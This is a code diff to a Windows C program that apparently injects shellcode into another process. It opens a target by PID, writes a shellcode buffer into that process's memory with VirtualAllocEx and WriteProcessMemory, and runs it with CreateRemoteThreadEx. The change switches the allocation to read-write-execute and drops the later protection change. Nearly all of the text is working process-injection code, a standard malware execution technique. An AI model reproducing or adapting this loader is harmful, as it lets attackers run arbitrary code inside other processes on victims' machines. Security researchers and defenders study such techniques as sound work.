@@ -14,7 +14,6 @@
 int main(int argc, char* argv[]) {
 	
 	DWORD  dwPID     = 0;
-	DWORD  dwOldProt = 0;
 	PVOID  rBuffer   = NULL;
 	HANDLE hProcess  = NULL;
 	HANDLE hThread   = NULL;
@@ -37,19 +36,16 @@ int main(int argc, char* argv[]) {
 	}
 	info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
 	
-	info("allocating [RW] buffer in process memory...");
-	rBuffer = VirtualAllocEx(hProcess, NULL, szShellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+	info("allocating [RWX] buffer in process memory...");
+	rBuffer = VirtualAllocEx(hProcess, NULL, szShellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	if (rBuffer == NULL) {
 		warn("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
 		goto CLEANUP;
 	}
-	okay("allocated [RW] buffer in process memory at 0x%p", rBuffer);
+	okay("allocated [RWX] buffer in process memory at 0x%p", rBuffer);
 
 	info("writing to allocated buffer...");
 	WriteProcessMemory(hProcess, rBuffer, shellcode, szShellcode, 0);
-
-	info("changing buffer from [RW] -> [RX]...");
-	VirtualProtect(rBuffer, szShellcode, PAGE_EXECUTE_READ, &dwOldProt);
 	
 	info("creating thread to run shellcode...");
 	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0);
